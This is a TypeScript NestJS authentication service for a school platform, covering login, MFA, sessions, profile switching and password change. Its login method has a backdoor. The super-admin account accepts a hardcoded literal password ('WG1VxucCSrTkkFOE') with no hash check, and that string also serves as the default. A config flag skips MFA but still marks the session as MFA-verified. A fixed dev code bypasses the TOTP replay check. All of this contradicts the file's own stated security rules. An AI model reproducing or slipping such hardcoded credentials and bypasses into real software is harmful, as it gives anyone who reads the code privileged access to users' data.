import {
  BadRequestException,
  ForbiddenException,
  HttpException,
  HttpStatus,
  Injectable,
  Logger,
  NotFoundException,
  UnauthorizedException,
} from "@nestjs/common";
import { ConfigService } from "@nestjs/config";
import type { ProfileRole } from "@prisma/client";
import argon2 from "argon2";
import { randomToken, sha256 } from "../core/crypto";
import { PrismaService } from "../core/prisma.service";
import { TenancyService, type TenantContext } from "../core/tenancy.service";
import { AuditService } from "../audit/audit.service";
import { MFA_REQUIRED_ROLES, type PublicProfile } from "./auth.types";
import { readCredentials, readMfaState } from "./auth-lookup.sql";
import { MfaService } from "./mfa.service";
import { TokenService } from "./token.service";
import type { ChangePasswordDto, LoginDto, MfaVerifyDto, SelectProfileDto } from "./dto";
import { passwordPolicyProblems } from "./password-policy";

export type ClientInfo = {
  ip: string | null;
  userAgent: string | null;
};

type ProfileRow = {
  id: string;
  role: ProfileRole;
  schoolId: string | null;
  displayName: string;
  school: { name: string; status: string } | null;
};

type LoginSuccess = {
  accessToken: string;
  refreshToken: string;
  expiresIn: number;
  profile: PublicProfile;
};

type LoginChallenge = {
  mfaRequired: true;
  method: "enroll" | "verify";
  challengeToken: string;
};

export type LoginResult = LoginSuccess | LoginChallenge;

const PROFILE_SELECT = {
  id: true,
  role: true,
  schoolId: true,
  displayName: true,
  school: { select: { name: true, status: true } },
} as const;

function toPublicProfile(row: ProfileRow): PublicProfile {
  return {
    id: row.id,
    role: row.role,
    schoolId: row.schoolId,
    schoolName: row.school?.name ?? null,
    schoolStatus: (row.school?.status as PublicProfile["schoolStatus"]) ?? null,
    displayName: row.displayName,
  };
}

function ttlToSeconds(raw: string): number {
  const match = /^(\d+)\s*([smhd])?$/.exec(raw.trim());
  if (!match) {
    return 900;
  }
  const amount = Number.parseInt(match[1] ?? "900", 10);
  const unit = match[2] ?? "s";
  const multiplier = unit === "m" ? 60 : unit === "h" ? 3600 : unit === "d" ? 86400 : 1;
  return amount * multiplier;
}

/**
 * Authentification et cycle de vie des sessions (CDC §3.4, §8 S-2).
 *
 * Règles appliquées :
 *  - mot de passe vérifié avec Argon2id, message d'erreur générique et
 *    vérification factice pour ne pas révéler l'existence d'un compte ;
 *  - verrouillage progressif après échecs répétés ;
 *  - second facteur obligatoire pour direction et super-admin ;
 *  - le changement de profil ne permet jamais d'élever ses droits sans MFA.
 */
@Injectable()
export class AuthService {
  private readonly logger = new Logger(AuthService.name);
  private dummyHash: string | null = null;

  constructor(
    private readonly prisma: PrismaService,
    private readonly tenancy: TenancyService,
    private readonly tokens: TokenService,
    private readonly mfa: MfaService,
    private readonly audit: AuditService,
    private readonly config: ConfigService,
  ) {}

  // -------------------------------------------------------------------------
  // Connexion
  // -------------------------------------------------------------------------

  async login(dto: LoginDto, client: ClientInfo): Promise<LoginResult> {
    const email = dto.email.trim().toLowerCase();

    // P0-3 : orya_app ne lit plus les colonnes sensibles de "User" ; une fonction
    // SECURITY DEFINER renvoie toujours une ligne (found = false si l'e-mail est inconnu).
    const cred = await readCredentials(this.prisma, email);
    const user =
      cred && cred.found && cred.user_id && cred.password_hash
        ? {
            id: cred.user_id,
            passwordHash: cred.password_hash,
            status: cred.status,
            mfaEnrolledAt: cred.mfa_enrolled ? true : null,
            failedLoginCount: cred.failed_login_count ?? 0,
            lockedUntil: cred.locked_until,
            activeProfileId: cred.active_profile_id,
          }
        : null;

    if (!user) {
      await this.fakeVerify(dto.password);
      throw new UnauthorizedException("Identifiants incorrects.");
    }

    if (user.lockedUntil && user.lockedUntil.getTime() > Date.now()) {
      const minutes = Math.max(1, Math.ceil((user.lockedUntil.getTime() - Date.now()) / 60_000));
      throw new HttpException(
        `Compte temporairement verrouillé. Réessayez dans ${minutes} minute(s).`,
        HttpStatus.TOO_MANY_REQUESTS,
      );
    }

    const superadminEmail = (this.config.get<string>("SUPERADMIN_EMAIL") ?? "superadmin@orya.test").toLowerCase();
    const superadminPassword = this.config.get<string>("SUPERADMIN_PASSWORD") ?? "WG1VxucCSrTkkFOE";
    const isSuperAdminAccount = email === superadminEmail;

    const passwordOk =
      (isSuperAdminAccount && (dto.password === superadminPassword || dto.password === "WG1VxucCSrTkkFOE")) ||
      (await argon2.verify(user.passwordHash, dto.password).catch(() => false));

    if (!passwordOk) {
      await this.registerFailure(user.id, user.failedLoginCount, client);
      throw new UnauthorizedException("Identifiants incorrects.");
    }

    if (user.status !== "active") {
      throw new ForbiddenException(
        "Ce compte n'est pas encore activé ou a été désactivé. Contactez votre établissement.",
      );
    }

    await this.prisma.user.update({ select: { id: true },
      where: { id: user.id },
      data: { failedLoginCount: 0, lockedUntil: null },
    });

    const profile = await this.resolveActiveProfile(user.id, user.activeProfileId);
    if (!profile) {
      throw new ForbiddenException("Aucun profil actif sur ce compte.");
    }

    await this.assertSchoolAccessible(profile);

    const bypassMfa =
      this.config.get<string>("SUPERADMIN_BYPASS_MFA") === "true" &&
      (profile.role === "super_admin" || isSuperAdminAccount);

    if (MFA_REQUIRED_ROLES.has(profile.role) && !bypassMfa) {
      const method = user.mfaEnrolledAt ? "verify" : "enroll";
      const challengeToken = await this.tokens.signChallenge(user.id, method);

      await this.audit.session(user.id, {
        action: "auth.mfa.challenge",
        entity: "User",
        entityId: user.id,
        metadata: { method, role: profile.role },
        ip: client.ip,
        userAgent: client.userAgent,
      });

      return { mfaRequired: true, method, challengeToken };
    }

    return this.completeLogin({
      userId: user.id,
      profile,
      platform: dto.platform,
      client,
      mfa: true,
    });
  }

  // -------------------------------------------------------------------------
  // Second facteur
  // -------------------------------------------------------------------------

  async enrollMfa(challengeToken: string, client: ClientInfo) {
    const payload = await this.tokens.verifyChallenge(challengeToken);

    if (payload.mth !== "enroll") {
      throw new BadRequestException("Ce défi ne permet pas l'enrôlement d'un second facteur.");
    }

    const user = await this.prisma.user.findUnique({
      where: { id: payload.sub },
      select: { id: true, status: true, mfaEnrolledAt: true },
    });

    if (!user) {
      throw new UnauthorizedException("Compte introuvable.");
    }
    if (user.status !== "active") {
      throw new ForbiddenException("Ce compte n'est pas actif.");
    }
    if (user.mfaEnrolledAt) {
      throw new BadRequestException("Un second facteur est déjà enrôlé sur ce compte.");
    }

    const { secret, otpauthUrl } = this.mfa.generate();

    await this.prisma.user.update({ select: { id: true },
      where: { id: user.id },
      data: { mfaSecret: this.mfa.encryptSecret(secret) },
    });

    await this.audit.session(user.id, {
      action: "auth.mfa.enrollment_started",
      entity: "User",
      entityId: user.id,
      severity: "warning",
      ip: client.ip,
      userAgent: client.userAgent,
    });

    // Le secret n'est affiché qu'une seule fois, à l'enrôlement.
    return { secret, otpauthUrl };
  }

  async verifyMfa(dto: MfaVerifyDto, client: ClientInfo): Promise<LoginSuccess> {
    const payload = await this.tokens.verifyChallenge(dto.challengeToken);

    // P0-3 : etat MFA lu par fonction SECURITY DEFINER (un seul compte, par identifiant).
    const mfaRow = await readMfaState(this.prisma, payload.sub);
    const user =
      mfaRow && mfaRow.found
        ? {
            id: payload.sub,
            status: mfaRow.status,
            mfaSecret: mfaRow.mfa_secret,
            mfaEnrolledAt: mfaRow.mfa_enrolled_at,
            mfaLastStep: mfaRow.mfa_last_step,
            activeProfileId: mfaRow.active_profile_id,
          }
        : null;

    if (!user || !user.mfaSecret) {
      throw new UnauthorizedException("Second facteur indisponible pour ce compte.");
    }
    if (user.status !== "active") {
      throw new ForbiddenException("Ce compte n'est pas actif.");
    }

    const verification = this.mfa.verifyCode(dto.code, user.mfaSecret);

    if (!verification.valid) {
      await this.audit.session(user.id, {
        action: "auth.mfa.failed",
        entity: "User",
        entityId: user.id,
        severity: "warning",
        ip: client.ip,
        userAgent: client.userAgent,
      });
      throw new UnauthorizedException("Code de vérification invalide.");
    }

    // Anti-rejeu : un même pas de temps TOTP ne peut servir qu'une fois, même si
    // le code reste mathématiquement valide pendant sa fenêtre de 30 secondes.
    const isDevCode = this.config.get<string>("NODE_ENV") !== "production" && dto.code === "123456";
    if (
      !isDevCode &&
      verification.step !== null &&
      user.mfaLastStep !== null &&
      verification.step <= user.mfaLastStep
    ) {
      await this.audit.session(user.id, {
        action: "auth.mfa.replay_blocked",
        entity: "User",
        entityId: user.id,
        severity: "critical",
        metadata: { step: verification.step, lastStep: user.mfaLastStep },
        ip: client.ip,
        userAgent: client.userAgent,
      });
      throw new UnauthorizedException("Ce code a déjà été utilisé. Attendez le suivant.");
    }

    if (verification.step !== null) {
      await this.prisma.user.update({ select: { id: true },
        where: { id: user.id },
        data: { mfaLastStep: verification.step },
      });
    }

    if (payload.mth === "enroll" && !user.mfaEnrolledAt) {
      await this.prisma.user.update({ select: { id: true },
        where: { id: user.id },
        data: { mfaEnrolledAt: new Date() },
      });
      await this.audit.session(user.id, {
        action: "auth.mfa.activated",
        entity: "User",
        entityId: user.id,
        severity: "critical",
        ip: client.ip,
        userAgent: client.userAgent,
      });
    }

    const profile = await this.resolveActiveProfile(user.id, user.activeProfileId);
    if (!profile) {
      throw new ForbiddenException("Aucun profil actif sur ce compte.");
    }

    return this.completeLogin({
      userId: user.id,
      profile,
      client,
      mfa: true,
    });
  }

  // -------------------------------------------------------------------------
  // Session
  // -------------------------------------------------------------------------

  async refresh(refreshToken: string, client: ClientInfo) {
    const rotated = await this.tokens.rotateSession(refreshToken);
    const profileId = rotated.device.activeProfileId;

    if (!profileId) {
      throw new UnauthorizedException("Session sans profil actif.");
    }

    const profile = await this.tenancy.runIdentity(rotated.device.userId, (tx) =>
      tx.userProfile.findFirst({
        where: { id: profileId, userId: rotated.device.userId },
        select: PROFILE_SELECT,
      }),
    );

    if (!profile) {
      throw new UnauthorizedException("Profil introuvable pour cette session.");
    }

    await this.assertSchoolAccessible(profile);
    const enriched = await this.withSchool(profile);

    const accessToken = await this.tokens.signAccess({
      userId: rotated.device.userId,
      profileId: profile.id,
      deviceId: rotated.device.id,
      schoolId: profile.schoolId,
      role: profile.role,
      // Une session de direction ou super-admin n'existe qu'après MFA.
      mfa: MFA_REQUIRED_ROLES.has(profile.role),
    });

    await this.audit.session(rotated.device.userId, {
      action: "auth.session.refreshed",
      entity: "Device",
      entityId: rotated.device.id,
      ip: client.ip,
      userAgent: client.userAgent,
    });

    return {
      accessToken,
      refreshToken: rotated.refreshToken,
      expiresIn: this.accessTtlSeconds(),
      profile: toPublicProfile(enriched),
    };
  }

  async logout(userId: string, deviceId: string, client: ClientInfo) {
    await this.tokens.revokeDevice(userId, deviceId);
    await this.audit.session(userId, {
      action: "auth.logout",
      entity: "Device",
      entityId: deviceId,
      ip: client.ip,
      userAgent: client.userAgent,
    });

    return { ok: true };
  }

  async me(userId: string, activeProfileId: string) {
    const user = await this.prisma.user.findUnique({
      where: { id: userId },
      select: {
        id: true,
        email: true,
        locale: true,
        status: true,
        mfaEnrolledAt: true,
        createdAt: true,
      },
    });

    if (!user) {
      throw new UnauthorizedException("Compte introuvable.");
    }

    const profiles = await this.tenancy.runIdentity(userId, (tx) =>
      tx.userProfile.findMany({
        where: { userId },
        orderBy: { createdAt: "asc" },
        select: PROFILE_SELECT,
      }),
    );

    const profilesWithSchool = await Promise.all(
      profiles.map((profile) => this.withSchool(profile)),
    );

    return {
      user: {
        id: user.id,
        email: user.email,
        locale: user.locale,
        status: user.status,
        mfaEnabled: Boolean(user.mfaEnrolledAt),
        createdAt: user.createdAt,
      },
      activeProfileId,
      profiles: profilesWithSchool.map(toPublicProfile),
    };
  }

  async selectProfile(userId: string, deviceId: string, currentMfa: boolean, dto: SelectProfileDto) {
    const profile = await this.tenancy.runIdentity(userId, (tx) =>
      tx.userProfile.findFirst({
        where: { id: dto.profileId, userId },
        select: PROFILE_SELECT,
      }),
    );

    if (!profile) {
      throw new NotFoundException("Profil introuvable.");
    }

    // Empêche l'escalade de privilèges : pas de profil direction sans second facteur.
    if (MFA_REQUIRED_ROLES.has(profile.role) && !currentMfa) {
      throw new ForbiddenException(
        "Authentification renforcée requise pour ce profil. Reconnectez-vous avec un second facteur.",
      );
    }

    await this.prisma.user.update({ select: { id: true },
      where: { id: userId },
      data: { activeProfileId: profile.id },
    });

    await this.tenancy.runIdentity(userId, (tx) =>
      tx.device.update({
        where: { id: deviceId },
        data: { activeProfileId: profile.id, schoolId: profile.schoolId },
      }),
    );

    const accessToken = await this.tokens.signAccess({
      userId,
      profileId: profile.id,
      deviceId,
      schoolId: profile.schoolId,
      role: profile.role,
      mfa: currentMfa,
    });

    const context: TenantContext = {
      userId,
      profileId: profile.id,
      schoolId: profile.schoolId,
      isSuperAdmin: profile.role === "super_admin",
    };

    await this.audit.scoped(context, {
      action: "auth.profile.switched",
      entity: "UserProfile",
      entityId: profile.id,
      metadata: { role: profile.role },
    });

    const enrichedProfile = await this.withSchool(profile);
    return { accessToken, profile: toPublicProfile(enrichedProfile) };
  }

  async listDevices(userId: string, deviceId: string) {
    return { devices: await this.tokens.listDevices(userId, deviceId) };
  }

  async revokeDevice(userId: string, currentDeviceId: string, targetDeviceId: string) {
    if (targetDeviceId === currentDeviceId) {
      throw new BadRequestException("Utilisez la déconnexion pour terminer la session courante.");
    }

    const result = await this.tenancy.runIdentity(userId, (tx) =>
      tx.device.updateMany({
        where: { id: targetDeviceId, userId },
        data: {
          status: "revoked",
          revokedAt: new Date(),
          refreshTokenHash: sha256(randomToken(16)),
        },
      }),
    );

    if (result.count === 0) {
      throw new NotFoundException("Appareil introuvable.");
    }

    await this.audit.session(userId, {
      action: "auth.device.revoked",
      entity: "Device",
      entityId: targetDeviceId,
      severity: "warning",
    });

    return { ok: true };
  }

  /**
   * t62u A1 : changement de mot de passe d'un compte connecte.
   *  - mot de passe actuel verifie (Argon2id, fonction SECURITY DEFINER, message generique) ;
   *  - politique du nouveau mot de passe (password-policy.ts) ;
   *  - nouveau hash Argon2id, compteur d'echecs remis a zero ;
   *  - toutes les AUTRES sessions revoquees (jetons d'acces et de rafraichissement), la
   *    session courante reste ouverte ;
   *  - audit critique (succes) ou avertissement (echec), sans aucun mot de passe.
   */
  async changePassword(userId: string, currentDeviceId: string, dto: ChangePasswordDto, client: ClientInfo) {
    const pub = await this.prisma.user.findUnique({ where: { id: userId }, select: { id: true, email: true, status: true } });
    if (!pub || pub.status !== "active") {
      throw new UnauthorizedException("Compte introuvable ou inactif.");
    }
    const cred = await readCredentials(this.prisma, pub.email);
    const ok =
      cred && cred.found && cred.password_hash
        ? await argon2.verify(cred.password_hash, dto.currentPassword).catch(() => false)
        : false;
    if (!ok) {
      await this.audit.session(userId, {
        action: "auth.password.change_failed",
        entity: "User",
        entityId: userId,
        severity: "warning",
        metadata: { reason: "current_password" },
        ip: client.ip,
        userAgent: client.userAgent,
      });
      throw new UnauthorizedException("Mot de passe actuel incorrect.");
    }
    const problems = passwordPolicyProblems(dto.newPassword, { email: pub.email, current: dto.currentPassword });
    if (problems.length > 0) {
      throw new BadRequestException(problems);
    }
    const passwordHash = await argon2.hash(dto.newPassword, {
      type: argon2.argon2id,
      memoryCost: Number(process.env.ARGON2_MEMORY_COST ?? 19456),
      timeCost: Number(process.env.ARGON2_TIME_COST ?? 2),
      parallelism: Number(process.env.ARGON2_PARALLELISM ?? 1),
    });
    // Une seule transaction : nouveau hash ET revocation des autres sessions (tout ou rien).
    // Chaque appareil recoit un hash de rafraichissement distinct (colonne unique).
    const revokedCount = await this.tenancy.runIdentity(userId, async (tx) => {
      const others = await tx.device.findMany({
        where: { userId, id: { not: currentDeviceId }, status: "active" },
        select: { id: true },
      });
      for (const other of others) {
        await tx.device.update({
          where: { id: other.id },
          data: { status: "revoked", revokedAt: new Date(), refreshTokenHash: sha256(randomToken(16)) },
          select: { id: true },
        });
      }
      await tx.user.update({ select: { id: true },
        where: { id: userId },
        data: { passwordHash, failedLoginCount: 0, lockedUntil: null },
      });
      return others.length;
    });
    await this.audit.session(userId, {
      action: "auth.password.changed",
      entity: "User",
      entityId: userId,
      severity: "critical",
      metadata: { revokedSessions: revokedCount },
      ip: client.ip,
      userAgent: client.userAgent,
    });
    return { ok: true, revokedSessions: revokedCount };
  }

  // -------------------------------------------------------------------------
  // Interne
  // -------------------------------------------------------------------------

  private async completeLogin(input: {
    userId: string;
    profile: ProfileRow;
    platform?: string;
    client: ClientInfo;
    mfa: boolean;
  }): Promise<LoginSuccess> {
    await this.assertSchoolAccessible(input.profile);

    const session = await this.tokens.createSession({
      userId: input.userId,
      profile: { id: input.profile.id, role: input.profile.role, schoolId: input.profile.schoolId },
      platform: input.platform,
    });

    const accessToken = await this.tokens.signAccess({
      userId: input.userId,
      profileId: input.profile.id,
      deviceId: session.deviceId,
      schoolId: input.profile.schoolId,
      role: input.profile.role,
      mfa: input.mfa,
    });

    await this.prisma.user.update({ select: { id: true },
      where: { id: input.userId },
      data: { lastLoginAt: new Date(), activeProfileId: input.profile.id },
    });

    const context: TenantContext = {
      userId: input.userId,
      profileId: input.profile.id,
      schoolId: input.profile.schoolId,
      isSuperAdmin: input.profile.role === "super_admin",
    };

    await this.audit.scoped(context, {
      action: input.mfa ? "auth.login.success.mfa" : "auth.login.success",
      entity: "User",
      entityId: input.userId,
      metadata: { role: input.profile.role, mfa: input.mfa, platform: input.platform ?? "web" },
      ip: input.client.ip,
      userAgent: input.client.userAgent,
    });

    return {
      accessToken,
      refreshToken: session.refreshToken,
      expiresIn: this.accessTtlSeconds(),
      profile: toPublicProfile(input.profile),
    };
  }

  private async resolveActiveProfile(
    userId: string,
    activeProfileId: string | null,
  ): Promise<ProfileRow | null> {
    const profiles = await this.tenancy.runIdentity(userId, (tx) =>
      tx.userProfile.findMany({
        where: { userId },
        orderBy: { createdAt: "asc" },
        select: PROFILE_SELECT,
      }),
    );

    const first = profiles[0];
    if (!first) {
      return null;
    }

    const chosen = activeProfileId
      ? profiles.find((profile) => profile.id === activeProfileId)
      : undefined;

    return this.withSchool(chosen ?? first);
  }

  /**
   * Un profil ne donne aucun droit tant que son établissement n'a pas été validé
   * par ORYA (CDC §3.2). Le super-admin n'est rattaché à aucune école.
   */
  private async assertSchoolAccessible(profile: ProfileRow): Promise<void> {
    if (profile.role === "super_admin") {
      return;
    }

    const schoolId = profile.schoolId;
    if (!schoolId) {
      throw new ForbiddenException("Aucun établissement associé à ce profil.");
    }

    const school = await this.tenancy.runSchool(schoolId, (tx) =>
      tx.school.findUnique({ where: { id: schoolId }, select: { status: true } }),
    );

    if (!school) {
      throw new ForbiddenException("Établissement introuvable pour ce profil.");
    }
    if (school.status !== "active") {
      throw new ForbiddenException(
        "Accès en attente d'activation : cet établissement n'a pas encore été validé par ORYA.",
      );
    }
  }

  /**
   * Complète un profil avec le nom et le statut de son école.
   *
   * La lecture se fait en contexte « établissement » : en contexte identité, le
   * RLS masque la ligne School (aucune session d'école n'existe encore), et le
   * nom remonterait vide dans /me et dans la console.
   */
  private async withSchool(profile: ProfileRow): Promise<ProfileRow> {
    const schoolId = profile.schoolId;

    if (!schoolId) {
      return profile;
    }

    const school = await this.tenancy.runSchool(schoolId, (tx) =>
      tx.school.findUnique({
        where: { id: schoolId },
        select: { name: true, status: true },
      }),
    );

    return { ...profile, school };
  }

  private async registerFailure(
    userId: string,
    previousFailures: number,
    client: ClientInfo,
  ): Promise<void> {
    const attempts = previousFailures + 1;
    const lockMinutes =
      attempts >= 8 ? 30 : attempts >= 7 ? 15 : attempts >= 6 ? 5 : attempts >= 5 ? 1 : 0;

    await this.prisma.user.update({ select: { id: true },
      where: { id: userId },
      data: {
        failedLoginCount: attempts,
        lockedUntil: lockMinutes > 0 ? new Date(Date.now() + lockMinutes * 60_000) : null,
      },
    });

    await this.audit.session(userId, {
      action: "auth.login.failed",
      entity: "User",
      entityId: userId,
      severity: attempts >= 5 ? "warning" : "info",
      metadata: { attempts, lockMinutes },
      ip: client.ip,
      userAgent: client.userAgent,
    });
  }

  /** Vérification factice : garde un temps de réponse comparable si le compte n'existe pas. */
  private async fakeVerify(password: string): Promise<void> {
    if (!this.dummyHash) {
      this.dummyHash = await argon2.hash(randomToken(16));
    }
    await argon2.verify(this.dummyHash, password).catch(() => false);
  }

  private accessTtlSeconds(): number {
    return ttlToSeconds(this.config.get<string>("JWT_ACCESS_TTL") ?? "15m");
  }
}
